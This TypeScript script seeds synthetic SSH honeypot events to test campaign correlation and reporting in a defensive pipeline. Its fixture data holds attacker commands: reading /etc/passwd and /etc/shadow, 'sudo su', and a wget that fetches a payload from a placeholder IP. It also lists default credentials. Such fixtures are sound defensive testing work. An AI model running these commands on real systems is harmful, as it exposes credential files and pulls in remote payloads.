/**
 * Seed synthetic ENRICHED events (no LLM) to exercise correlation + reporting
 * without spending Gemini quota. Writes data/enriched.jsonl.
 * Usage: npx tsx scripts/seed-enriched.ts
 */
import "dotenv/config";
import { mkdirSync, writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";
import { EnrichedEventSchema } from "../src/mastra/schemas";

const t0 = Date.now();
const iso = (offsetMin: number) =>
  new Date(t0 - offsetMin * 60_000).toISOString();

function evt(
  sourceIp: string,
  offsetMin: number,
  username: string,
  password: string,
  commands: string[],
  classification: string,
  severity: number,
  reasoning: string,
  geo?: { country: string; city: string; asnOrg: string },
) {
  return EnrichedEventSchema.parse({
    id: randomUUID(),
    timestamp: iso(offsetMin),
    sourceIp,
    sourcePort: 40000 + Math.floor(Math.random() * 20000),
    service: "ssh",
    usernameTried: username,
    passwordTried: password,
    commandsAttempted: commands,
    sessionDurationMs: 500 + Math.floor(Math.random() * 3000),
    raw: { clientVersion: "SSH-2.0-OpenSSH_9.2p1" },
    classification,
    severity,
    reasoning,
    geo,
    enrichmentWarnings: geo ? [] : ["geo lookup unavailable"],
  });
}

// Campaign A: one IP, 6 events a few minutes apart, escalating to an exploit
// attempt. Every gap stays inside the 30-minute correlation window, so this
// must collapse into exactly ONE campaign and trigger a report (FR6).
const A: unknown[] = [
  evt(
    "198.51.100.23",
    29,
    "root",
    "toor",
    ["whoami"],
    "credential_stuffing",
    3,
    "Default root credential attempted.",
  ),
  evt(
    "198.51.100.23",
    27,
    "root",
    "admin",
    ["whoami", "uname -a"],
    "recon",
    3,
    "System enumeration after login.",
  ),
  evt(
    "198.51.100.23",
    24,
    "admin",
    "admin123",
    ["ls", "cat /etc/passwd"],
    "recon",
    3,
    "Browsing system accounts.",
  ),
  evt(
    "198.51.100.23",
    19,
    "admin",
    "admin123",
    ["sudo su"],
    "active_exploit_attempt",
    4,
    "Attempting privilege escalation.",
  ),
  evt(
    "198.51.100.23",
    12,
    "admin",
    "admin123",
    ["cat /etc/shadow"],
    "active_exploit_attempt",
    5,
    "Reading password hashes.",
    {
      country: "Netherlands",
      city: "Amsterdam",
      asnOrg: "AS64512 — Example Transit BV",
    },
  ),
  evt(
    "198.51.100.23",
    4,
    "admin",
    "admin123",
    ["wget http://198.51.100.23/p.sh"],
    "active_exploit_attempt",
    5,
    "Downloading a remote payload.",
    {
      country: "Netherlands",
      city: "Amsterdam",
      asnOrg: "AS64512 — Example Transit BV",
    },
  ),
];

// Campaign B: different IP, 2 events, low severity. Separate campaign, below
// the report threshold, so no report is generated.
const B: unknown[] = [
  evt(
    "203.0.113.90",
    45,
    "oracle",
    "welcome1",
    ["ls"],
    "recon",
    2,
    "Shallow directory listing.",
    {
      country: "Brazil",
      city: "São Paulo",
      asnOrg: "AS64513 — Example Net",
    },
  ),
  evt(
    "203.0.113.90",
    40,
    "oracle",
    "oracle",
    ["uname -a"],
    "recon",
    2,
    "Kernel version probe.",
    {
      country: "Brazil",
      city: "São Paulo",
      asnOrg: "AS64513 — Example Net",
    },
  ),
];

// Campaign C: the same IP as A, but 3 hours later — outside the window, so it
// must NOT merge into campaign A.
const C: unknown[] = [
  evt(
    "198.51.100.23",
    180,
    "root",
    "toor",
    ["whoami"],
    "credential_stuffing",
    3,
    "Same IP returning much later; a separate campaign.",
  ),
];

mkdirSync("data", { recursive: true });
writeFileSync(
  "data/enriched.jsonl",
  [...A, ...B, ...C].map((e) => JSON.stringify(e)).join("\n") + "\n",
);
console.log(
  `Seeded ${A.length + B.length + C.length} enriched events into data/enriched.jsonl`,
);
console.log(
  "  198.51.100.23 (6 events, all gaps <30min, max sev 5) -> expect 1 campaign + report",
);
console.log(
  "  203.0.113.90  (2 events, max sev 2)                    -> expect 1 campaign, no report",
);
console.log(
  "  198.51.100.23 again, 3h later                         -> expect a SEPARATE campaign",
);
